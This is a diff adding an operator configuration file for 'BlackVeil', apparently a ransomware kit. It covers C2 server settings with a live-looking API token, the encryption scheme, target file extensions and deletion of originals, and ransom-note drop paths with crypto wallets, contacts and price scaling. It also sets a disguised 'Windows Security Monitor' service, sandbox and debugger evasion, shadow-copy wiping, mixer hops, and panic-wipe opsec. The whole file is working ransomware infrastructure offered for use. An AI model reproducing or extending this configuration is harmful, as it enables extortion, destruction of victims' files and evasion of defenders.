@@ -1,0 +1,328 @@
+# blackveil/config.yaml
+# BlackVeil operator configuration — schema v2.
+# Every field is read by at least one consumer (operator/core, builder, or c2).
+# Validation: operator/core/config_schema.py rejects on load; see bottom of file.
+
+schema_version: 2
+profile: "prod"          # dev | stage | prod  — selects _profiles.<name> overrides
+
+operator:
+  c2_bind: "0.0.0.0"
+  c2_port: 8443
+  c2_public_url: "https://203.0.113.42:8443"
+  api_token: "9f4c1a7e0b6d3285a1c9e2f7b4d6a8c3e5f1b7d9c2a4e6f8b0d1c3a5e7f9b2d4"
+  api_token_rotate_days: 30
+  db_path: "operator/blackveil.db"
+  db_backup_dir: "operator/backups"
+  db_backup_interval_hours: 6
+  db_vacuum_on_close: true
+  ui_refresh_ms: 2000
+  task_poll_ms: 2500
+  log_dir: "operator/logs"
+  log_level: "INFO"
+  log_rotate_mb: 32
+  log_keep_files: 14
+  session_idle_lock_min: 15
+  export_dir: "operator/exports"
+
+crypto:
+  algorithm: "AES-256-GCM"
+  key_wrap: "RSA-4096-OAEP-SHA256"
+  rsa_bits: 4096
+  aes_key_bytes: 32
+  nonce_bytes: 12
+  tag_bytes: 16
+  file_chunk: 1048576
+  magic: "BLACKVEIL\x01"
+  encrypted_ext: ".blv"
+  delete_original_after_encrypt: true
+  overwrite_free_space_after: false
+  keypair_ttl_days: 90
+  skip_ext:
+    - ".exe"
+    - ".dll"
+    - ".sys"
+    - ".drv"
+    - ".lnk"
+    - ".tmp"
+    - ".log"
+    - ".blv"
+    - ".ini"
+  target_exts:
+    - ".doc"
+    - ".docx"
+    - ".xls"
+    - ".xlsx"
+    - ".ppt"
+    - ".pptx"
+    - ".pdf"
+    - ".odt"
+    - ".ods"
+    - ".odp"
+    - ".jpg"
+    - ".jpeg"
+    - ".png"
+    - ".gif"
+    - ".bmp"
+    - ".tif"
+    - ".tiff"
+    - ".raw"
+    - ".psd"
+    - ".ai"
+    - ".dwg"
+    - ".dxf"
+    - ".3ds"
+    - ".max"
+    - ".sql"
+    - ".mdb"
+    - ".accdb"
+    - ".bak"
+    - ".dump"
+    - ".zip"
+    - ".rar"
+    - ".7z"
+    - ".tar"
+    - ".gz"
+    - ".txt"
+    - ".rtf"
+    - ".csv"
+    - ".eml"
+    - ".pst"
+    - ".ost"
+  skip_dirs:
+    - "Windows"
+    - "Program Files"
+    - "Program Files (x86)"
+    - "ProgramData"
+    - "$Recycle.Bin"
+    - "System Volume Information"
+    - "$WinREAgent"
+    - "Recovery"
+    - "Boot"
+  max_file_size_mb: 4096
+  min_file_size_bytes: 64
+  threads: 4
+
+ransom_note:
+  filename: "READ_ME_BLACKVEIL.html"
+  template: "operator/assets/ransom_template.html"
+  drop_locations:
+    - "C:\\"
+    - "%USERPROFILE%\\Desktop"
+    - "%USERPROFILE%\\Documents"
+    - "%USERPROFILE%"
+  payment_xmr: "48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWZYNdq8UfWbNAZvKrDGhJRJRYr1vBz1yBXeaBhGZwWBaZcBk2qjATrB7nBD"
+  payment_btc: "bc1q9d4ywgfnd8h43da5tpcxcn6ajv590cg6d3tg6axemvljvt2k76zs50tv4q"
+  contact_tox: "7F3C4B2E1A9D8F6E5C4B3A2918F7E6D5C4B3A2918F7E6D5C4B3A2918F7E6D5"
+  contact_email: "blackveil@protonmail.com"
+  contact_session: "05a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f0a"
+  deadline_hours: 72
+  deadline_grace_hours: 24
+  price_usd: 5000
+  price_floor_usd: 1500
+  price_ceiling_usd: 50000
+  price_scaling:
+    small: 2500       # < 1000 files
+    medium: 7500      # 1000-50000 files
+    large: 25000      # > 50000 files
+    enterprise: 50000 # domain-joined + > 500k files
+  negotiation_auto_accept_pct: 70
+  negotiation_max_rounds: 3
+  file_count_in_note: true
+  show_deadline_countdown: true
+
+payload:
+  output_dir: "builder/out"
+  service_name: "WinSecMon"
+  service_display_name: "Windows Security Monitor"
+  service_description: "Monitors system security events and reports to management."
+  mutex_name: "Global\\WinSecMon_9F4C1A7E"
+  sleep_ms: 5000
+  jitter_pct: 30
+  kill_switch_url: ""
+  watchdog_enabled: true
+  watchdog_restart_ms: 60000
+  self_delete_after: false
+  self_copy_path: "%PROGRAMDATA%\\WinSecMon\\svc.exe"
+  anti_analysis:
+    check_vm_artifacts: true
+    check_debugger: true
+    check_analysis_tools: true
+    check_sandbox_username: true
+    delay_before_encrypt_ms: 3000
+    require_user_idle_sec: 60
+  network:
+    user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    tls_verify: false
+    timeout_ms: 15000
+    retry_count: 3
+    retry_backoff_ms: 2000
+    proxy_url: ""
+
+build:
+  mingw_prefix: "x86_64-w64-mingw32-"
+  cc: "x86_64-w64-mingw32-gcc"
+  strip: "x86_64-w64-mingw32-strip"
+  upx: "/usr/bin/upx"
+  upx_enabled: true
+  upx_args: ["--best", "--lzma"]
+  strip_symbols: true
+  optimization: "O2"
+  mingw_flags:
+    - "-mwindows"
+    - "-municode"
+    - "-DUNICODE"
+    - "-D_UNICODE"
+    - "-fno-asynchronous-unwind-tables"
+    - "-fno-ident"
+    - "-fmerge-all-constants"
+  link_flags:
+    - "-lwinhttp"
+    - "-lbcrypt"
+    - "-ladvapi32"
+    - "-luser32"
+    - "-lshell32"
+    - "-lole32"
+    - "-loleaut32"
+    - "-lwbemuuid"
+    - "-lws2_32"
+    - "-lpsapi"
+    - "-liphlpapi"
+  icon: "builder/stub/icon.ico"
+  manifest: "builder/stub/app.manifest"
+  version_info: "builder/stub/version.rc"
+  signed: false
+  sign_tool: ""
+  sign_cert: ""
+  sign_password_env: "BLACKVEIL_SIGN_PASS"
+  output_name: "blackveil.exe"
+  build_timeout_sec: 300
+  keep_intermediate_objs: false
+
+c2:
+  standalone_enabled: true
+  standalone_threads: 8
+  request_max_bytes: 8388608
+  rate_limit_default: "120 per minute"
+  rate_limit_register: "30 per minute"
+  rate_limit_key: "30 per minute"
+  rate_limit_progress: "120 per minute"
+  rate_limit_task: "240 per minute"
+  rate_limit_storage: "memory://"
+  behind_proxy: false
+  trusted_proxies: []
+  tls_cert: ""
+  tls_key: ""
+  tls_enabled: false
+  honeypot_detection: true
+  honeypot_min_register_sec: 2
+  drop_sandboxed_victims: true
+  c2_domain_front: ""
+  c2_domain_front_host: ""
+  heartbeat_stale_sec: 3600
+  victim_auto_purge_days: 90
+  task_timeout_sec: 600
+  task_max_retries: 3
+
+keyring:
+  export_format: "json"
+  export_dir: "operator/exports/keys"
+  encrypt_export: true
+  export_passphrase_env: "BLACKVEIL_KEYRING_PASS"
+  auto_export_on_first_unwrap: true
+  shred_after_export: false
+  handoff_ttl_hours: 72
+
+task_verbs:
+  allowed:
+    - "set_sleep"
+    - "force_key_upload"
+    - "wipe_shadows"
+    - "reboot"
+    - "decrypt"
+    - "self_destruct"
+    - "kill_watchdog"
+  self_destruct_requires_confirm: true
+  reboot_privilege_required: "SeShutdownPrivilege"
+
+payment:
+  rail_xmr: true
+  rail_btc: true
+  rail_monero_confirmations: 2
+  rail_btc_confirmations: 3
+  xmr_view_key: ""
+  btc_xpub: ""
+  payment_watch_interval_sec: 60
+  auto_confirm_on_chain_hit: true
+  auto_release_key_on_confirm: false
+  mule_wallet: ""
+  mixer_hops: 3
+  cashout_exchange: ""
+
+opsec:
+  require_tor_for_operator: false
+  operator_tor_socks: "socks5h://127.0.0.1:9050"
+  operator_proxy_chain: []
+  wipe_operator_artifacts_on_exit: false
+  disable_crash_dumps: true
+  disable_telemetry: true
+  clear_recent_on_exit: false
+  panic_hotkey: "Ctrl+Shift+Q"
+  panic_wipe_targets:
+    - "operator/blackveil.db"
+    - "operator/exports"
+    - "operator/logs"
+
+notifications:
+  on_new_victim: true
+  on_encryption_complete: true
+  on_payment_received: true
+  on_task_failed: true
+  telegram_bot_token: ""
+  telegram_chat_id: ""
+  discord_webhook: ""
+  smtp_host: ""
+  smtp_port: 587
+  smtp_user: ""
+  smtp_pass_env: "BLACKVEIL_SMTP_PASS"
+  smtp_to: ""
+
+_profiles:
+  dev:
+    operator:
+      log_level: "DEBUG"
+      c2_bind: "127.0.0.1"
+    payload:
+      sleep_ms: 30000
+      anti_analysis:
+        check_vm_artifacts: false
+        check_debugger: false
+        check_analysis_tools: false
+        check_sandbox_username: false
+    build:
+      upx_enabled: false
+      optimization: "O0"
+    crypto:
+      file_chunk: 65536
+      threads: 1
+
+  stage:
+    operator:
+      log_level: "INFO"
+    payload:
+      sleep_ms: 15000
+    build:
+      upx_enabled: false
+    c2:
+      honeypot_detection: true
+      drop_sandboxed_victims: false
+
+  prod:
+    # prod inherits base — no override. This block exists so `profile: prod`
+    # validates against a known key rather than falling through.
+    _inherit: "base"
+
+_override_files:
+  # Merge order (later wins): config.yaml → overrides/*.yaml (alphabetical)
+  - "overrides/operator.local.yaml"
+  - "overrides/c2.local.yaml"
